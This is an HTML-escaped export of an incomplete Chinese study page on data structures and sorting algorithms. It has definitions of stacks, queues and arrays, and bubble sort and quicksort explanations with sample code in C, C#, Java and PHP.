&lt;li&gt;双循环链表&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;li&gt;栈（stack）：是计算机科学中一种特殊的串列形式的抽象数据类型，按照后进先出（LIFO, Last In First Out）的原理运作。其特殊之处在于只能允许在链表或数组的一端（称为堆栈顶端指针，英语：top）进行加入数据（英语：push）和输出数据（英语：pop）的运算。&lt;/li&gt;
&lt;li&gt;队列：又称为伫列（queue），是先进先出（FIFO, First-In-First-Out）的线性表。队列只允许在后端（称为rear）进行插入操作，在前端（称为front）进行删除操作。&lt;/li&gt;
&lt;li&gt;数组：在计算机科学中，数组数据结构（英语：array data structure），简称数组（英语：Array），是由相同类型的元素（element）的集合所组成的数据结构，分配一块连续的内存来存储。
&lt;img src=&quot;http://localhost:4000/assets/images/array-data-structure-01.jpg&quot; alt=&quot;array-data-structure-01.jpg&quot; /&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;数组的特点是：数据的元素在上下界内是连续的；随机访问速度快。&lt;/li&gt;
&lt;/ul&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org01c6718&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org01c6718&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;3&lt;/span&gt; 树&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-3&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org380a7b4&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org380a7b4&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.1&lt;/span&gt; 二叉树&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgb6ebed2&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgb6ebed2&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.2&lt;/span&gt; AVL 树&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org017d4ba&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org017d4ba&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.3&lt;/span&gt; 伸展树&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org151ae43&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org151ae43&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.4&lt;/span&gt; 红黑树&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org9e201a7&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org9e201a7&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;3.5&lt;/span&gt; 哈夫曼树&lt;/h3&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgc2d81fb&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;orgc2d81fb&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;4&lt;/span&gt; 堆&lt;/h2&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org55cfb1b&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org55cfb1b&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;5&lt;/span&gt; 图&lt;/h2&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org7b880ad&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org7b880ad&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;6&lt;/span&gt; 排序算法&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-6&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orged4c6bf&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orged4c6bf&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.1&lt;/span&gt; 冒泡排序(BubbleSort)&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-1&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgf39ab40&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgf39ab40&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.1.1&lt;/span&gt; 介绍(Introduction)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-6-1-1&quot;&gt;
&lt;p&gt;
&lt;b&gt;en&lt;/b&gt;
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
Bubblesort is a popular,but inefficient,sorting algorithm. It works by repeatedly swapping adjacent elements that are out of order.
&lt;/pre&gt;

&lt;p&gt;
&lt;b&gt;cn&lt;/b&gt;
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
冒泡排序是一种较简单的排序算法。它会遍历若干次要排序的数列，每次遍历时，它都会从前往后依次的比较相邻两个数的大小；如果前者比后者大，
则交换它们的位置。这样，一次遍历之后，最大的元素就在数列的末尾！ 采用相同的方法再次遍历时，第二大的元素就被排列在最大元素之前。重复
此操作，直到整个数列都有序为止！
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org1f00802&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org1f00802&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.1.2&lt;/span&gt; 伪代码(pseudo code)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-6-1-2&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 1: &lt;/span&gt;pseudo code&lt;/label&gt;&lt;pre class=&quot;src src-emacs-lisp&quot;&gt;for i = 1 to A.length - 1
    for j = A:length downto i + 1
        if A[j] &amp;lt; A[j-1]   
            exchange A[j] with A[j - 1]
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org9182ad5&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org9182ad5&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.1.3&lt;/span&gt; 时间复杂度和稳定性&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-6-1-3&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
冒泡排序的时间复杂度是O(N2)。
假设被排序的数列中有N个数。遍历一趟的时间复杂度是O(N)，需要遍历多少次呢？N-1次！因此，冒泡排序的时间复杂度是O(N2)。
&lt;/pre&gt;


&lt;pre class=&quot;example&quot;&gt;
冒泡排序是稳定的算法，它满足稳定算法的定义。
算法稳定性 -- 假设在数列中存在a[i]=a[j]，若在排序之前，a[i]在a[j]前面；并且排序之后，a[i]仍然在a[j]前面。则这个排序算法是稳定的！
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org025287f&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org025287f&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.1.4&lt;/span&gt; 实现(realization)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-6-1-4&quot;&gt;
&lt;p&gt;
&lt;b&gt;C&lt;/b&gt;
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 2: &lt;/span&gt;C&lt;/label&gt;&lt;pre class=&quot;src src-C&quot;&gt;&lt;span style=&quot;color: #78dce8;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #fcfcfa;&quot;&gt;i&lt;/span&gt;,&lt;span style=&quot;color: #fcfcfa;&quot;&gt;j&lt;/span&gt;;
&lt;span style=&quot;color: #78dce8;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #fcfcfa;&quot;&gt;flag&lt;/span&gt;; &lt;span style=&quot;color: #727072;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;&amp;#26631;&amp;#35760;&lt;/span&gt;
&lt;span style=&quot;color: #ff6188;&quot;&gt;for&lt;/span&gt; (i=n-1; i&amp;gt;0; i--)
{
    flag = 0; &lt;span style=&quot;color: #727072;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;&amp;#21021;&amp;#22987;&amp;#21270;&amp;#26631;&amp;#35760;&amp;#20026;0&lt;/span&gt;
    &lt;span style=&quot;color: #727072;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;&amp;#23558;a[0...i]&amp;#20013;&amp;#26368;&amp;#22823;&amp;#30340;&amp;#25968;&amp;#25454;&amp;#25918;&amp;#22312;&amp;#26411;&amp;#23614;&lt;/span&gt;
    &lt;span style=&quot;color: #ff6188;&quot;&gt;for&lt;/span&gt; (j=0; j&amp;lt;i; j++)
    {
        &lt;span style=&quot;color: #ff6188;&quot;&gt;if&lt;/span&gt; (a[j] &amp;gt; a[j+1])
        {
            swap(a[j], a[j+1]);
            flag = 1;    &lt;span style=&quot;color: #727072;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;&amp;#33509;&amp;#21457;&amp;#29983;&amp;#20132;&amp;#25442;&amp;#65292;&amp;#21017;&amp;#35774;&amp;#26631;&amp;#35760;&amp;#20026;1&lt;/span&gt;
        }
    }
    &lt;span style=&quot;color: #ff6188;&quot;&gt;if&lt;/span&gt; (flag==0)
        &lt;span style=&quot;color: #ff6188;&quot;&gt;break&lt;/span&gt;;&lt;span style=&quot;color: #727072;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;&amp;#33509;&amp;#27809;&amp;#21457;&amp;#29983;&amp;#20132;&amp;#25442;&amp;#65292;&amp;#21017;&amp;#35828;&amp;#26126;&amp;#25968;&amp;#21015;&amp;#24050;&amp;#26377;&amp;#24207;&amp;#12290;&lt;/span&gt;
} 
&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;
&lt;b&gt;C#&lt;/b&gt;
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 3: &lt;/span&gt;C#&lt;/label&gt;&lt;pre class=&quot;src src-emacs-lisp&quot;&gt;//Core code.
for (int i = 0&lt;span style=&quot;color: #727072;&quot;&gt;; &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;i &amp;lt; arrInt.Length - 1; i++)&lt;/span&gt;
{
    for (int j = 1&lt;span style=&quot;color: #727072;&quot;&gt;; &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;j &amp;lt; arrInt.Length - i; j++)&lt;/span&gt;
    {
        if (arrInt[j] &amp;lt; arrInt[j - 1])
        {
            //&amp;#20132;&amp;#25442;&amp;#20540;
            int temp = arrInt[j]&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
            arrInt[j] = arrInt[j - 1]&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
            arrInt[j - 1] = temp&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
        }
    }
}
&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;
&lt;b&gt;Java&lt;/b&gt;
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 4: &lt;/span&gt;Java&lt;/label&gt;&lt;pre class=&quot;src src-java&quot;&gt;&lt;span style=&quot;color: #ff6188;&quot;&gt;public&lt;/span&gt; &lt;span style=&quot;color: #ff6188;&quot;&gt;static&lt;/span&gt; &lt;span style=&quot;color: #78dce8;&quot;&gt;void&lt;/span&gt; &lt;span style=&quot;color: #a9dc76;&quot;&gt;BubbleSort&lt;/span&gt;(&lt;span style=&quot;color: #78dce8;&quot;&gt;int&lt;/span&gt;[] &lt;span style=&quot;color: #fcfcfa;&quot;&gt;arr&lt;/span&gt;,&lt;span style=&quot;color: #78dce8;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #fcfcfa;&quot;&gt;num&lt;/span&gt;) {
    &lt;span style=&quot;color: #ff6188;&quot;&gt;for&lt;/span&gt; (&lt;span style=&quot;color: #78dce8;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #fcfcfa;&quot;&gt;i&lt;/span&gt; = 0; i &amp;lt; arr.&lt;span style=&quot;color: #78dce8;&quot;&gt;length&lt;/span&gt;; i++) {
            &lt;span style=&quot;color: #ff6188;&quot;&gt;for&lt;/span&gt; (&lt;span style=&quot;color: #78dce8;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #fcfcfa;&quot;&gt;j&lt;/span&gt; = num-1; j &amp;gt;i; j--) {
                    &lt;span style=&quot;color: #ff6188;&quot;&gt;if&lt;/span&gt; (arr[i]&amp;gt;arr[j]) {
                            &lt;span style=&quot;color: #78dce8;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #fcfcfa;&quot;&gt;temp&lt;/span&gt;=arr[i];
                            arr[i]=arr[j];
                            arr[j]=temp;
                    }
            }
    }
    &lt;span style=&quot;color: #ff6188;&quot;&gt;for&lt;/span&gt;(&lt;span style=&quot;color: #78dce8;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #fcfcfa;&quot;&gt;k&lt;/span&gt;=0;k&amp;lt;&lt;span style=&quot;color: #78dce8;&quot;&gt;num&lt;/span&gt;;k++){
            System.out.print(arr[k]+&lt;span style=&quot;color: #ffd866;&quot;&gt;&quot; &quot;&lt;/span&gt;);
    }
}
&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;
&lt;b&gt;PHP&lt;/b&gt;
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;label class=&quot;org-src-name&quot;&gt;&lt;span class=&quot;listing-number&quot;&gt;Listing 5: &lt;/span&gt;PHP&lt;/label&gt;&lt;pre class=&quot;src src-shell&quot;&gt;&lt;span style=&quot;color: #ff6188;&quot;&gt;function&lt;/span&gt; &lt;span style=&quot;color: #a9dc76;&quot;&gt;BubbleSort&lt;/span&gt;($&lt;span style=&quot;color: #fcfcfa;&quot;&gt;arr&lt;/span&gt;){
        &lt;span style=&quot;color: #ff6188;&quot;&gt;for&lt;/span&gt;($&lt;span style=&quot;color: #fcfcfa;&quot;&gt;i&lt;/span&gt;=0;$&lt;span style=&quot;color: #fcfcfa;&quot;&gt;i&lt;/span&gt;&amp;lt;count($&lt;span style=&quot;color: #fcfcfa;&quot;&gt;arr&lt;/span&gt;);$&lt;span style=&quot;color: #fcfcfa;&quot;&gt;i&lt;/span&gt;++){
                &lt;span style=&quot;color: #ff6188;&quot;&gt;for&lt;/span&gt;($&lt;span style=&quot;color: #fcfcfa;&quot;&gt;j&lt;/span&gt;=0;$&lt;span style=&quot;color: #fcfcfa;&quot;&gt;j&lt;/span&gt;&amp;lt;$&lt;span style=&quot;color: #fcfcfa;&quot;&gt;i&lt;/span&gt;;$&lt;span style=&quot;color: #fcfcfa;&quot;&gt;j&lt;/span&gt;++){
                        &lt;span style=&quot;color: #ff6188;&quot;&gt;if&lt;/span&gt;($&lt;span style=&quot;color: #fcfcfa;&quot;&gt;arr&lt;/span&gt;[$&lt;span style=&quot;color: #fcfcfa;&quot;&gt;i&lt;/span&gt;]&amp;gt;$&lt;span style=&quot;color: #fcfcfa;&quot;&gt;arr&lt;/span&gt;[$&lt;span style=&quot;color: #fcfcfa;&quot;&gt;j&lt;/span&gt;]){
                                $&lt;span style=&quot;color: #fcfcfa;&quot;&gt;temp&lt;/span&gt; = $&lt;span style=&quot;color: #fcfcfa;&quot;&gt;arr&lt;/span&gt;[$&lt;span style=&quot;color: #fcfcfa;&quot;&gt;i&lt;/span&gt;];
                                $&lt;span style=&quot;color: #fcfcfa;&quot;&gt;arr&lt;/span&gt;[$&lt;span style=&quot;color: #fcfcfa;&quot;&gt;i&lt;/span&gt;] = $&lt;span style=&quot;color: #fcfcfa;&quot;&gt;arr&lt;/span&gt;[$&lt;span style=&quot;color: #fcfcfa;&quot;&gt;j&lt;/span&gt;];
                                $&lt;span style=&quot;color: #fcfcfa;&quot;&gt;arr&lt;/span&gt;[$&lt;span style=&quot;color: #fcfcfa;&quot;&gt;j&lt;/span&gt;] = $&lt;span style=&quot;color: #fcfcfa;&quot;&gt;temp&lt;/span&gt;;
                        }
                }
        }
        foreach($&lt;span style=&quot;color: #fcfcfa;&quot;&gt;arr&lt;/span&gt; as $&lt;span style=&quot;color: #fcfcfa;&quot;&gt;value&lt;/span&gt;){
                &lt;span style=&quot;color: #ab9df2;&quot;&gt;echo&lt;/span&gt; $&lt;span style=&quot;color: #fcfcfa;&quot;&gt;value&lt;/span&gt;.&lt;span style=&quot;color: #ffd866;&quot;&gt;&quot; &quot;&lt;/span&gt;;
        }
}
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgb4cf07c&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgb4cf07c&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.2&lt;/span&gt; 快速排序(QuickSort)&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-2&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org78796c2&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org78796c2&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.2.1&lt;/span&gt; 介绍(Introduction)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-6-2-1&quot;&gt;
&lt;p&gt;
&lt;b&gt;cn&lt;/b&gt;
&lt;/p&gt;
&lt;pre class=&quot;example&quot;&gt;
快速排序(Quick Sort)使用分治法策略。
基本思想是：选择一个基准数，通过一趟排序将要排序的数据分割成独立的两部分；其中一部分的所有数据都比另外
一部分的所有数据都要小。然后，再按此方法对这两部分数据分别进行快速排序，整个排序过程可以递归进行，以此
达到整个数据变成有序序列。
&lt;/pre&gt;


&lt;pre class=&quot;example&quot;&gt;
快速排序流程：
(1) 从数列中挑出一个基准值。
(2) 将所有比基准值小的摆放在基准前面，所有比基准值大的摆在基准的后面(相同的数可以到任一边)；在这个分区退出之后，该基准就处于数列的中间位置。
(3) 递归地把&quot;基准值前面的子数列&quot;和&quot;基准值后面的子数列&quot;进行排序。
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org0154495&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org0154495&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.2.2&lt;/span&gt; 伪代码(pseudo code)&lt;/h4&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org8289f83&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org8289f83&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.2.3&lt;/span&gt; 时间复杂度和稳定&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-6-2-3&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;
快速排序的时间复杂度在最坏情况下是O(N2)，平均的时间复杂度是O(N*lgN)。 
这句话很好理解：假设被排序的数列中有N个数。遍历一次的时间复杂度是O(N)，需要遍历多少次呢？至少lg(N+1)次，最多N次。
(01) 为什么最少是lg(N+1)次？快速排序是采用的分治法进行遍历的，我们将它看作一棵二叉树，它需要遍历的次数就是二叉树的深度，而根据完全二叉树的定义，它的深度至少是lg(N+1)。因此，快速排序的遍历次数最少是lg(N+1)次。
(02) 为什么最多是N次？这个应该非常简单，还是将快速排序看作一棵二叉树，它的深度最大是N。因此，快读排序的遍历次数最多是N次。
&lt;/pre&gt;


&lt;pre class=&quot;example&quot;&gt;
快速排序是不稳定的算法，它不满足稳定算法的定义。
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orge1ef4f5&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orge1ef4f5&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.2.4&lt;/span&gt; 实现(realization)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-6-2-4&quot;&gt;
&lt;p&gt;
&lt;b&gt;C&lt;/b&gt;
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-C&quot;&gt;&lt;span style=&quot;color: #727072;&quot;&gt;/**&lt;/span&gt;
&lt;span style=&quot;color: #727072;&quot;&gt;* arr -- &amp;#24453;&amp;#25490;&amp;#24207;&amp;#30340;&amp;#25968;&amp;#32452;&lt;/span&gt;
&lt;span style=&quot;color: #727072;&quot;&gt;* left -- &amp;#25968;&amp;#32452;&amp;#30340;&amp;#24038;&amp;#36793;&amp;#30028;&lt;/span&gt;
&lt;span style=&quot;color: #727072;&quot;&gt;* right -- &amp;#25968;&amp;#32452;&amp;#30340;&amp;#21491;&amp;#36793;&amp;#30028;&lt;/span&gt;
&lt;span style=&quot;color: #727072;&quot;&gt;*/&lt;/span&gt;
&lt;span style=&quot;color: #78dce8;&quot;&gt;void&lt;/span&gt; &lt;span style=&quot;color: #a9dc76;&quot;&gt;quick_sort&lt;/span&gt;(&lt;span style=&quot;color: #78dce8;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #fcfcfa;&quot;&gt;arr&lt;/span&gt;[],&lt;span style=&quot;color: #78dce8;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #fcfcfa;&quot;&gt;left&lt;/span&gt;,&lt;span style=&quot;color: #78dce8;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #fcfcfa;&quot;&gt;right&lt;/span&gt;){
    &lt;span style=&quot;color: #ff6188;&quot;&gt;if&lt;/span&gt;(left &amp;lt; right){
            &lt;span style=&quot;color: #78dce8;&quot;&gt;int&lt;/span&gt; &lt;span style=&quot;color: #fcfcfa;&quot;&gt;i&lt;/span&gt;,&lt;span style=&quot;color: #fcfcfa;&quot;&gt;j&lt;/span&gt;,&lt;span style=&quot;color: #fcfcfa;&quot;&gt;k&lt;/span&gt;;
            i = left;
            j = right;
            k = arr[i];
            &lt;span style=&quot;color: #ff6188;&quot;&gt;while&lt;/span&gt;(i &amp;lt; j){
                    &lt;span style=&quot;color: #ff6188;&quot;&gt;while&lt;/span&gt;(i &amp;lt; j &amp;amp;&amp;amp; arr[j] &amp;gt; k){
                            j--; &lt;span style=&quot;color: #727072;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;&amp;#20174;&amp;#21491;&amp;#24448;&amp;#24038;&amp;#25214;&amp;#19968;&amp;#20010;&amp;#23567;&amp;#20110; k &amp;#30340;&amp;#25968;&lt;/span&gt;
                    }
                    &lt;span style=&quot;color: #ff6188;&quot;&gt;if&lt;/span&gt;(i &amp;lt; j){
                            arr[i++] = arr[j];
                    }
                    &lt;span style=&quot;color: #ff6188;&quot;&gt;while&lt;/span&gt;(i&amp;lt;j &amp;amp;&amp;amp; arr[i] &amp;lt; k){
                            i++; &lt;span style=&quot;color: #727072;&quot;&gt;// &lt;/span&gt;&lt;span style=&quot;color: #727072; font-style: italic;&quot;&gt;&amp;#20174;&amp;#24038;&amp;#24448;&amp;#21491;&amp;#25214;&amp;#31532;&amp;#19968;&amp;#20010;&amp;#22823;&amp;#20110; k &amp;#30340;&amp;#25968;&lt;/span&gt;
                    }
            }
            arr[i] = k;
            quick_sort(arr,left,i-1);
            quick_sort(arr,i+1,right);
    }
}
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;
&lt;b&gt;Java&lt;/b&gt;
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-java&quot;&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;
&lt;b&gt;PHP&lt;/b&gt;
&lt;/p&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-shell&quot;&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org7fa6d96&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org7fa6d96&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.3&lt;/span&gt; 插入排序(InsertSort)&lt;/h3&gt;
&lt;div class=&quot;outline-text-3&quot; id=&quot;text-6-3&quot;&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org57717f6&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org57717f6&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.3.1&lt;/span&gt; 介绍(Instoduction)&lt;/h4&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org3817d09&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;org3817d09&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.3.2&lt;/span&gt; 伪代码(pseudo code)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-6-3-2&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot;&gt;for j=2 to A.length
    key=A[j]&lt;span style=&quot;color: #727072;&quot;&gt;;&lt;/span&gt;
    //Insert A[j] into the sorted sequence A[1..j-1]
    i=j-1
    while i&amp;gt;0 and A[i]&amp;gt;key
         A[i+1]=A[i]
         i=i-1
    A[i+1]=key
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgf9908d3&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgf9908d3&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.3.3&lt;/span&gt; 实现(realization)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-6-3-3&quot;&gt;
&lt;pre class=&quot;example&quot;&gt;

&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgff596f2&quot; class=&quot;outline-4&quot;&gt;
&lt;h4 id=&quot;orgff596f2&quot;&gt;&lt;span class=&quot;section-number-4&quot;&gt;6.3.4&lt;/span&gt; 分而治之(divideand-conquer)&lt;/h4&gt;
&lt;div class=&quot;outline-text-4&quot; id=&quot;text-6-3-4&quot;&gt;
&lt;div class=&quot;org-src-container&quot;&gt;
&lt;pre class=&quot;src src-emacs-lisp&quot;&gt;
&lt;/pre&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org9eaced7&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org9eaced7&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.4&lt;/span&gt; 选择排序&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org7ee17ed&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org7ee17ed&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.5&lt;/span&gt; 希尔排序&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orge1fba89&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orge1fba89&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.6&lt;/span&gt; 归并排序&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org3d92621&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;org3d92621&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.7&lt;/span&gt; 基数排序&lt;/h3&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-orgc5d3782&quot; class=&quot;outline-3&quot;&gt;
&lt;h3 id=&quot;orgc5d3782&quot;&gt;&lt;span class=&quot;section-number-3&quot;&gt;6.8&lt;/span&gt; 堆排序&lt;/h3&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;div id=&quot;outline-container-org28e7202&quot; class=&quot;outline-2&quot;&gt;
&lt;h2 id=&quot;org28e7202&quot;&gt;&lt;span class=&quot;section-number-2&quot;&gt;7&lt;/span&gt; 参考资料&lt;/h2&gt;
&lt;div class=&quot;outline-text-2&quot; id=&quot;text-7&quot;&gt;
&lt;ul class=&quot;org-ul&quot;&gt;
&lt;li&gt;&lt;a href=&quot;https://zh.wikipedia.org/wiki/%E7%BA%BF%E6%80%A7%E8%A1%A8&quot;&gt;线性表-维基百科&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.cnblogs.com/skywang12345/p/3603935.html&quot;&gt;数据结构与算法系列 目录&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
